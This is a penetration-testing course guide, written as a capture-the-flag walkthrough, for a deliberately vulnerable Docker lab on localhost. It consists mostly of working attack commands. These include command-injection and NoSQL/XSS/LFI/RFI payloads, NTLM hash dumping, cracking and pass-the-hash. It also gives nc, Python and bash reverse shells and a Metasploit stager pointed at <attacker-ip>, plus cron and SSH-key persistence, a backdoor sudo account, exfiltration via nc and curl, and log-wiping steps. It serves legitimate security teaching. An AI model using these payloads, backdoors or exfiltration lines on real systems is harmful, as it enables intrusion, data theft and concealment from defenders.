# IntelliMetrics CTF - Complete Penetration Testing Guide

## ğŸ“š Course Coverage

This CTF covers all major topics from your penetration testing course:

- **Cours 11**: Planification des tests d'intrusion (mÃ©thodologie, portÃ©e, dÃ©couverte vs exploitation)
- **Cours 09**: Post-exploitation (pivoting, Ã©vasion A/V, relais Netcat, PowerShell Empire concepts)
- **Cours 08**: Attaques Web (XSS, CSRF, SQL/NoSQL Injection, LFI/RFI, Command Injection)
- **Cours 07**: IngÃ©nierie sociale (hameÃ§onnage - conceptuel)
- **Cours 05**: Attaques sur les mots de passe (LM/NTLM Hash, john, hashcat, pass-the-hash)

---

## ğŸ¯ Target Environment

### Architecture Overview

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                          DMZ Zone                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”‚
â”‚  â”‚   Frontend   â”‚         â”‚ API Gateway  â”‚                 â”‚
â”‚  â”‚  Port: 4321  â”‚         â”‚  Port: 8080  â”‚                 â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                  â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Internal Zone                           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Auth Service â”‚   â”‚ File Service â”‚   â”‚   MongoDB    â”‚   â”‚
â”‚  â”‚ Port: 8081   â”‚   â”‚ Port: 8082   â”‚   â”‚ Port: 27017  â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                  â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                       Backend Zone                           â”‚
â”‚                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                          â”‚
â”‚                   â”‚  SSH Server  â”‚                          â”‚
â”‚                   â”‚  Port: 2222  â”‚                          â”‚
â”‚                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Services Summary

| Service | Port | Description | Key Vulnerabilities |
|---------|------|-------------|-------------------|
| Frontend | 4321 | Astro Web App | XSS, CSRF, Clickjacking |
| API Gateway | 8080 | Main Backend API | Command Injection, NoSQL Injection, Secrets Exposure |
| Auth Service | 8081 | Authentication | LM/NTLM Hashes, Pass-the-Hash, Password Spray |
| File Service | 8082 | File Management | LFI, RFI, Unrestricted Upload |
| MongoDB | 27017 | Database | No Authentication, Direct Access |
| SSH | 2222 | Remote Access | Weak Passwords, Pivoting Target |

---

## ğŸš€ Phase 0: Environment Setup

### Prerequisites

```bash
# Required tools
- Docker & Docker Compose
- nmap
- curl
- jq
- hydra
- john the ripper
- hashcat
- metasploit framework
- netcat
- MongoDB client (mongosh)
```

### Start the Environment

```bash
cd /path/to/intellimetrics-demo

# Method 1: Using start script
chmod +x start.sh
./start.sh

# Method 2: Manual Docker Compose
docker-compose down -v
docker-compose build
docker-compose up -d

# Wait for services to initialize
sleep 15

# Verify services are running
docker-compose ps
```

### Verify Services

```bash
# Test API Gateway
curl http://localhost:8080/health

# Test Auth Service
curl http://localhost:8081/api/auth/users

# Test File Service
curl http://localhost:8082/api/files/list

# Test Frontend
open http://localhost:4321

# Test MongoDB
mongosh mongodb://localhost:27017/intellimetrics --eval "db.companies.findOne()"

# Test SSH
ssh -p 2222 admin@localhost
# Password: Admin123!
```

---

## ğŸ“¡ Phase 1: Reconnaissance (Cours 11 - DÃ©couverte)

### 1.1 Host Discovery

```bash
# Ping scan to identify live hosts
nmap -sn localhost

# If testing from external host
nmap -sn <target-ip>
```

### 1.2 Port Scanning

```bash
# Quick scan of common ports
nmap -p 22,80,2222,4321,8080,8081,8082,27017 localhost

# Comprehensive scan with service detection
nmap -p- -sV -sC -oA intellimetrics_scan localhost

# Aggressive scan with OS detection
nmap -A -p- -oA intellimetrics_aggressive localhost

# Save results
cat intellimetrics_scan.nmap
```

**Expected Results:**
```
PORT      STATE SERVICE     VERSION
2222/tcp  open  ssh         OpenSSH (protocol 2.0)
4321/tcp  open  http        Node.js
8080/tcp  open  http        Gin web framework
8081/tcp  open  http        Gin web framework
8082/tcp  open  http        Gin web framework
27017/tcp open  mongodb     MongoDB 7.0
```

### 1.3 Service Enumeration

```bash
# Web service enumeration
for port in 4321 8080 8081 8082; do
  echo "=== Port $port ==="
  curl -I http://localhost:$port/
  echo ""
done

# MongoDB enumeration
nmap -p 27017 --script mongodb-info localhost

# SSH banner grabbing
nc localhost 2222
```

### 1.4 Web Application Discovery

```bash
# Discover API endpoints
curl -s http://localhost:8080/health | jq '.'

# Check for common endpoints
for endpoint in /api /admin /api/admin /health /debug /config; do
  echo "Testing: $endpoint"
  curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080$endpoint
done

# Directory bruteforcing (optional)
dirb http://localhost:8080 /usr/share/wordlists/dirb/common.txt
```

---

## ğŸ” Phase 2: Enumeration & Vulnerability Analysis (Cours 11 - Analyse)

### 2.1 API Gateway Enumeration

#### Exposed Configuration (Critical!)

```bash
# Retrieve all secrets and credentials
curl -s http://localhost:8080/api/admin/config | jq '.' > api_secrets.json

cat api_secrets.json
```

**What you'll find:**
- MongoDB URI
- OpenAI API Key
- JWT Secret
- Stripe Secret Key
- AWS Access Keys
- Admin credentials

#### Debug Information Disclosure

```bash
# Get system information
curl -s http://localhost:8080/api/admin/debug | jq '.'
```

**Leaked information:**
- Environment variables
- Hostname
- OS details
- Working directory

#### Command Injection Testing

```bash
# Test basic command execution
curl -s "http://localhost:8080/api/admin/system?cmd=whoami" | jq '.'

# Enumerate system
curl -s "http://localhost:8080/api/admin/system?cmd=id" | jq '.'
curl -s "http://localhost:8080/api/admin/system?cmd=hostname" | jq '.'
curl -s "http://localhost:8080/api/admin/system?cmd=cat%20/etc/passwd" | jq '.'

# Network information
curl -s "http://localhost:8080/api/admin/system?cmd=ifconfig" | jq '.'
curl -s "http://localhost:8080/api/admin/system?cmd=ip%20addr" | jq '.'

# Process listing
curl -s "http://localhost:8080/api/admin/system?cmd=ps%20aux" | jq '.'
```

### 2.2 Authentication Service Enumeration (Cours 05 - Mots de passe)

#### User Enumeration

```bash
# Get list of users
curl -s http://localhost:8081/api/auth/users | jq '.'
```

**Discovered users:**
- admin
- john
- sarah
- dbadmin
- test

#### Password Hash Extraction

```bash
# Dump NTLM hashes
curl -s http://localhost:8081/api/auth/debug/hashes | jq '.' > ntlm_hashes.json

# Get SAM-formatted hashes (ready for john/hashcat)
curl -s http://localhost:8081/api/auth/sam-dump | jq -r '.data' > hashes_sam.txt

cat hashes_sam.txt
```

**Example output:**
```
admin:1000:E52CAC67419A9A224A3B108F3FA6CB6D:209C6174DA490CAEB422F3FA5A7AE634:::
john:1001:AAD3B435B51404EEAAD3B435B51404EE:E19CCF75EE54E06B06A5907AF13CEF42:::
sarah:1002:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
dbadmin:1003:C23413A8A1E7665FAAD3B435B51404EE:B7C899154197D6E04DE72F9DDA8F7E8C:::
test:1004:AAD3B435B51404EEAAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::
```

#### Password Hints

```bash
# Get password hints for each user
for user in admin john sarah dbadmin test; do
  echo "User: $user"
  curl -s http://localhost:8081/api/auth/hint/$user | jq -r '.hint'
  echo ""
done
```

### 2.3 File Service Enumeration (Cours 08 - LFI/RFI)

#### Directory Listing

```bash
# List files in document directory
curl -s http://localhost:8082/api/files/list | jq '.'

# List other directories (Path traversal)
curl -s "http://localhost:8082/api/files/list?dir=/etc" | jq '.'
curl -s "http://localhost:8082/api/files/list?dir=/app" | jq '.'
```

#### Local File Inclusion (LFI)

```bash
# Read sensitive files from document directory
curl -s "http://localhost:8082/api/files/read?file=/app/documents/passwords.txt" | jq -r '.content'

curl -s "http://localhost:8082/api/files/read?file=/app/documents/.env" | jq -r '.content'

curl -s "http://localhost:8082/api/files/read?file=/app/documents/config.txt" | jq -r '.content'

# Path traversal to read system files
curl -s "http://localhost:8082/api/files/read?file=/etc/passwd" | jq -r '.content'

curl -s "http://localhost:8082/api/files/read?file=/etc/shadow" | jq -r '.content' 2>/dev/null

# Read application source code
curl -s "http://localhost:8082/api/files/read?file=/app/main" | jq -r '.content' | strings
```

#### Check Backup Files

```bash
# Enumerate available backups
curl -s http://localhost:8082/api/files/backup | jq '.'
```

### 2.4 NoSQL Injection Testing (Cours 08)

#### Basic Query

```bash
# Normal query
curl -s -X POST http://localhost:8080/api/analytics/query \
  -H "Content-Type: application/json" \
  -d '{"company_id": "COMP-10001"}' | jq '.'
```

#### NoSQL Injection with MongoDB Operators

```bash
# Extract all companies using $gt operator
curl -s -X POST http://localhost:8080/api/analytics/query \
  -H "Content-Type: application/json" \
  -d '{"filters": {"revenue": {"$gt": 0}}}' | jq '.'

# Using $ne (not equal) operator
curl -s -X POST http://localhost:8080/api/analytics/query \
  -H "Content-Type: application/json" \
  -d '{"filters": {"company_id": {"$ne": ""}}}' | jq '.'

# Using $regex for pattern matching
curl -s -X POST http://localhost:8080/api/analytics/query \
  -H "Content-Type: application/json" \
  -d '{"filters": {"industry": {"$regex": ".*"}}}' | jq '.'
```

### 2.5 MongoDB Direct Access

```bash
# Connect to MongoDB (no authentication required!)
mongosh mongodb://localhost:27017/intellimetrics

# Inside mongosh:
show dbs
use intellimetrics
show collections
db.companies.find()
db.companies.find().pretty()

# Count documents
db.companies.countDocuments()

# Find specific data
db.companies.find({industry: "SaaS"})

# Exit
exit
```

### 2.6 XSS Testing (Cours 08)

#### Reflected XSS

```bash
# Visit in browser:
http://localhost:4321/admin

# In the search box, enter:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

#### Stored XSS

```bash
# In the announcement field:
<script>alert('Stored XSS')</script>
<img src=x onerror=alert(document.cookie)>
```

#### DOM-based XSS

```bash
# In the settings theme field:
<img src=x onerror=alert('DOM XSS')>
```

---

## ğŸ’£ Phase 3: Exploitation (Cours 11 - Exploitation)

### 3.1 Password Cracking (Cours 05)

#### Using John the Ripper

```bash
# Crack NTLM hashes with default wordlist
john --format=nt hashes_sam.txt

# With wordlist
john --format=nt hashes_sam.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With rules
john --format=nt hashes_sam.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules

# Show cracked passwords
john --show --format=nt hashes_sam.txt

# Create custom wordlist based on password hints
cat > custom_wordlist.txt <<EOF
Admin123!
Password1
Welcome2024
Database!
test
IntelliMetrics123
Intellimetrics123!
EOF

john --format=nt hashes_sam.txt --wordlist=custom_wordlist.txt
```

#### Using Hashcat

```bash
# NTLM hash mode is 1000
# Extract just the NT hashes
awk -F: '{print $4}' hashes_sam.txt > ntlm_only.txt

# Crack with hashcat
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 1000 ntlm_only.txt --show
```

**Expected Results:**
```
admin:Admin123!
john:Password1
sarah:Welcome2024
dbadmin:Database!
test:test
```

### 3.2 Pass-the-Hash Attack (Cours 05)

#### Using Captured NTLM Hash

```bash
# Once you have the NT hash, use it directly without cracking
curl -s -X POST http://localhost:8081/api/auth/pth \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "nt_hash": "209C6174DA490CAEB422F3FA5A7AE634"
  }' | jq '.'
```

**This demonstrates how pass-the-hash works - you don't need the plaintext password!**

### 3.3 SSH Password Spray Attack (Cours 05)

```bash
# Create username list
cat > users.txt <<EOF
admin
developer
backup
testuser
dbadmin
root
EOF

# Create password list (from cracked hashes + common passwords)
cat > passwords.txt <<EOF
Admin123!
Password1
Welcome2024
Database!
test
Dev2024!
Backup123
password
admin
123456
EOF

# Use Hydra for password spraying
hydra -L users.txt -P passwords.txt ssh://localhost:2222

# Or use individual tests
for user in admin developer backup testuser dbadmin; do
  for pass in "Admin123!" "Password1" "Dev2024!" "Backup123" "test"; do
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p 2222 $user@localhost "whoami" 2>/dev/null && \
      echo "[+] Success: $user:$pass"
  done
done
```

**Successful credentials:**
```
admin:Admin123!
developer:Dev2024!
backup:Backup123
testuser:test
dbadmin:Database!
```

### 3.4 Command Injection Exploitation (Cours 08)

#### Manual Exploitation

```bash
# Basic reverse shell payload
curl -s "http://localhost:8080/api/admin/system?cmd=nc%20-e%20/bin/sh%20<attacker-ip>%204444"

# Python reverse shell
PAYLOAD='python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker-ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'

curl -s "http://localhost:8080/api/admin/system?cmd=$PAYLOAD"

# Bash reverse shell
PAYLOAD='/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
curl -s "http://localhost:8080/api/admin/system?cmd=$PAYLOAD"
```

#### Using Metasploit

```bash
# Start Metasploit
msfconsole

# Use web delivery exploit
use exploit/multi/script/web_delivery
set TARGET 6  # Python
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
set SRVHOST <attacker-ip>
set SRVPORT 8000
exploit -j

# The exploit will generate a command like:
# python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://<attacker-ip>:8000/...',context=ssl._create_unverified_context());exec(r.read());"

# URL-encode and execute via command injection:
PAYLOAD="<generated-python-command>"
curl -s "http://localhost:8080/api/admin/system?cmd=$PAYLOAD"
```

#### Set up listener first

```bash
# In another terminal
nc -lvnp 4444

# Or use Metasploit handler
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
exploit
```

### 3.5 File Upload & Execution (Cours 08)

#### Create Malicious Script

```bash
# Create a reverse shell script
cat > shell.sh <<'EOF'
#!/bin/sh
/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF

# Upload the file
curl -X POST http://localhost:8082/api/files/upload \
  -F "file=@shell.sh"

# Execute the uploaded file
curl -s "http://localhost:8082/api/files/execute?file=shell.sh"
```

#### Webshell Upload

```bash
# Create a simple webshell
cat > webshell.sh <<'EOF'
#!/bin/sh
echo "Content-type: text/plain"
echo ""
$1
EOF

# Upload
curl -X POST http://localhost:8082/api/files/upload -F "file=@webshell.sh"

# Execute commands through it
curl -s "http://localhost:8082/api/files/execute?file=webshell.sh" -d "whoami"
```

### 3.6 Remote File Inclusion (RFI) (Cours 08)

```bash
# Host a malicious file on attacker machine
cat > malicious.sh <<'EOF'
#!/bin/bash
whoami
id
hostname
cat /etc/passwd
EOF

# Start a web server
python3 -m http.server 8000

# Execute via RFI
curl -s "http://localhost:8082/api/files/include?url=http://<attacker-ip>:8000/malicious.sh"
```

---

## ğŸ”“ Phase 4: Post-Exploitation (Cours 09)

### 4.1 Initial Access via SSH

```bash
# Connect with cracked credentials
ssh -p 2222 admin@localhost
# Password: Admin123!

# You're now on the SSH server
```

### 4.2 Local Enumeration

```bash
# On the SSH server:

# Check privileges
whoami
id
sudo -l

# System information
hostname
uname -a
cat /etc/os-release

# Network information
ifconfig
ip addr
ip route
netstat -antup

# Find sensitive files
find / -name "*password*" 2>/dev/null
find / -name "*.env" 2>/dev/null
find /home -type f 2>/dev/null

# Check bash history
cat ~/.bash_history
cat /home/admin/.bash_history

# Look for secrets
cat /opt/secrets/prod.env
cat /opt/secrets/api_keys.txt

# Check for other users
cat /etc/passwd | grep -v nologin
```

### 4.3 Network Pivoting (Cours 09 - Pivoting)

#### Method 1: SSH Local Port Forwarding

```bash
# From your attack machine:
# Forward internal MongoDB to your local machine
ssh -L 27018:mongo:27017 -p 2222 admin@localhost

# Now you can access MongoDB on localhost:27018
mongosh mongodb://localhost:27018/intellimetrics
```

#### Method 2: SSH Remote Port Forwarding

```bash
# From the compromised SSH server:
# Forward your local service to the internal network
ssh -R 9000:localhost:4444 attacker@<attacker-ip>

# Now internal services can connect back to your listener on port 9000
```

#### Method 3: SSH Dynamic Port Forwarding (SOCKS Proxy)

```bash
# From your attack machine:
ssh -D 1080 -p 2222 admin@localhost

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use proxychains to access internal network
proxychains nmap -sT 172.18.0.0/24
proxychains curl http://mongo:27017
```

#### Method 4: Netcat Relay (Cours 09 - Relai Netcat)

```bash
# On the compromised SSH server:
# Create a named pipe
mknod backpipe p

# Set up the relay (forward port 2222 to internal service)
nc -l -p 9999 0<backpipe | nc 172.18.0.3 8080 1>backpipe

# From attacker machine, access internal service through relay:
curl http://localhost:9999/api/admin/config
```

### 4.4 Lateral Movement

```bash
# From SSH server, scan internal network
nmap -sn 172.18.0.0/24

# Try to access other containers
curl http://api:8080/api/admin/config
curl http://auth-service:8081/api/auth/sam-dump
curl http://file-service:8082/api/files/list

# Access MongoDB directly
mongosh mongodb://mongo:27017/intellimetrics
```

### 4.5 Privilege Escalation

```bash
# Check sudo permissions
sudo -l

# The admin user has NOPASSWD sudo!
sudo whoami

# Get root shell
sudo /bin/bash

# Now as root:
whoami  # root
id      # uid=0(root)

# Read all secrets
cat /opt/secrets/*

# Access other containers (if Docker socket is mounted)
docker ps
docker exec -it intellimetrics-api /bin/sh
```

### 4.6 Persistence

```bash
# Add SSH key for backdoor access
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Create cronjob for reverse shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'") | crontab -

# Create new admin user
sudo adduser backdoor
sudo echo "backdoor:Password123!" | chpasswd
sudo usermod -aG sudo backdoor
```

### 4.7 Data Exfiltration

```bash
# Dump MongoDB
mongosh mongodb://mongo:27017/intellimetrics --eval "db.companies.find().forEach(printjson)" > /tmp/db_dump.json

# Exfiltrate via netcat
nc <attacker-ip> 5555 < /tmp/db_dump.json

# Or via HTTP
curl --data-binary @/tmp/db_dump.json http://<attacker-ip>:8000/upload

# Or via SCP
scp -P 22 /tmp/db_dump.json attacker@<attacker-ip>:/tmp/

# Compress and exfiltrate
tar czf /tmp/loot.tar.gz /opt/secrets /home/admin/.bash_history /etc/passwd
base64 /tmp/loot.tar.gz > /tmp/loot.b64
curl --data-binary @/tmp/loot.b64 http://<attacker-ip>:8000/
```

---

## ğŸ›¡ï¸ Phase 5: Covering Tracks (Optional)

```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear logs
sudo cat /dev/null > /var/log/auth.log
sudo cat /dev/null > /var/log/syslog

# Remove uploaded files
rm /app/uploads/shell.sh
rm /tmp/db_dump.json
rm /tmp/loot.tar.gz
```

---

## ğŸ“‹ Kill Chain Summary

```
1. RECONNAISSANCE
   â”œâ”€ nmap scan â†’ Discover services (8080, 8081, 8082, 2222, 27017, 4321)
   â””â”€ Service enumeration â†’ Identify technologies

2. ENUMERATION
   â”œâ”€ API Gateway â†’ Exposed secrets, debug info
   â”œâ”€ Auth Service â†’ NTLM hashes, user list
   â”œâ”€ File Service â†’ LFI, directory listing
   â””â”€ MongoDB â†’ No authentication

3. EXPLOITATION
   â”œâ”€ Crack passwords â†’ john/hashcat
   â”œâ”€ Pass-the-hash â†’ Direct hash usage
   â”œâ”€ Command injection â†’ RCE on API gateway
   â”œâ”€ SSH bruteforce â†’ Access to SSH server
   â””â”€ File upload â†’ Arbitrary code execution

4. POST-EXPLOITATION
   â”œâ”€ SSH access â†’ admin:Admin123!
   â”œâ”€ Privilege escalation â†’ sudo to root
   â”œâ”€ Network pivoting â†’ SSH tunneling, netcat relay
   â”œâ”€ Lateral movement â†’ Access internal services
   â”œâ”€ Data exfiltration â†’ MongoDB dump, secrets
   â””â”€ Persistence â†’ SSH keys, cron jobs

5. IMPACT
   â””â”€ Full compromise of all services and data
```

---

## ğŸ“ Course Topic Mapping

| Phase | Course Topic | Specific Technique |
|-------|-------------|-------------------|
| Recon | Cours 11 | nmap, service discovery, external testing |
| Enumeration | Cours 11 | Deep analysis, vulnerability identification |
| Password Attacks | Cours 05 | LM/NTLM cracking, john, hashcat, pass-the-hash |
| Web Attacks | Cours 08 | Command injection, NoSQL injection, XSS, CSRF, LFI/RFI |
| Exploitation | Cours 11 | Metasploit, payload delivery, gaining access |
| Post-Exploitation | Cours 09 | Pivoting (SSH), netcat relay, lateral movement |
| Persistence | Cours 09 | Backdoors, maintaining access |

---

## ğŸ”§ Tools Reference

### nmap
```bash
# Basic scan
nmap -p- localhost

# Service detection
nmap -sV -p 8080,8081,8082 localhost

# Script scan
nmap -sC -p 8080 localhost
```

### John the Ripper
```bash
# Crack NTLM
john --format=nt hashes.txt

# With wordlist
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john --show --format=nt hashes.txt
```

### Hashcat
```bash
# NTLM mode (-m 1000)
hashcat -m 1000 hashes.txt wordlist.txt

# With rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

### Hydra
```bash
# SSH password spray
hydra -L users.txt -P passwords.txt ssh://localhost:2222

# HTTP POST
hydra -l admin -P passwords.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### Metasploit
```bash
# Start
msfconsole

# Use exploit
use exploit/multi/script/web_delivery
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST <ip>
exploit

# Set up handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT 4444
exploit
```

### MongoDB
```bash
# Connect
mongosh mongodb://localhost:27017/intellimetrics

# Commands
show dbs
use intellimetrics
show collections
db.companies.find()
db.companies.find().pretty()
```

---

## ğŸ“ Report Template

### Executive Summary
- Target: IntelliMetrics Analytics Platform
- Scope: External penetration test
- Duration: [X hours]
- Critical findings: [X]
- High findings: [X]

### Vulnerabilities Found

#### CRITICAL: Unauthenticated Command Injection
- **CVSS**: 10.0
- **Endpoint**: `/api/admin/system?cmd=`
- **Impact**: Complete system compromise
- **Remediation**: Remove endpoint or implement strict authentication + input validation

#### CRITICAL: Password Hashes Exposed
- **CVSS**: 9.8
- **Endpoint**: `/api/auth/sam-dump`
- **Impact**: Account takeover, pass-the-hash attacks
- **Remediation**: Remove endpoint, implement authentication, use bcrypt

#### HIGH: Local File Inclusion
- **CVSS**: 8.5
- **Endpoint**: `/api/files/read?file=`
- **Impact**: Read arbitrary files, source code disclosure
- **Remediation**: Implement strict path validation, whitelist allowed files

[Continue for each finding...]

---

## âœ… Learning Objectives Achieved

- âœ“ Planning penetration tests (methodology, scope)
- âœ“ External reconnaissance techniques
- âœ“ Service enumeration and analysis
- âœ“ Password cracking (john, hashcat)
- âœ“ LM/NTLM hash exploitation
- âœ“ Pass-the-hash attacks
- âœ“ Web application vulnerabilities (XSS, CSRF, injection)
- âœ“ Command injection exploitation
- âœ“ NoSQL injection
- âœ“ Local File Inclusion (LFI)
- âœ“ Remote File Inclusion (RFI)
- âœ“ Post-exploitation techniques
- âœ“ Network pivoting (SSH tunneling)
- âœ“ Netcat relay techniques
- âœ“ Lateral movement
- âœ“ Privilege escalation
- âœ“ Using Metasploit framework
- âœ“ Complete kill chain execution

---

## ğŸ¯ Challenge Goals

1. [ ] Discover all 6 services
2. [ ] Extract password hashes
3. [ ] Crack at least 3 passwords
4. [ ] Perform successful pass-the-hash attack
5. [ ] Exploit command injection to get shell
6. [ ] Read sensitive files via LFI
7. [ ] Access MongoDB without credentials
8. [ ] SSH into the server
9. [ ] Pivot to internal network
10. [ ] Achieve root privileges
11. [ ] Exfiltrate database contents
12. [ ] Document all findings

Good luck! ğŸš€
